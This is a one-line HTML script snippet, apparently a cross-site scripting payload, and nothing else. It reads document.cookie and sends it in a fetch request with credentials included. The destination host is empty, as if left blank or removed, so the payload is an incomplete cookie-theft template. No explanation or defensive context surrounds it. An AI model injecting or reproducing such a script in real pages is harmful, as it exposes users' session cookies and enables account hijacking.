<script>
fetch(''+document.cookie, { credentials: 'include' }).then().catch(err => console.error(err));
</script>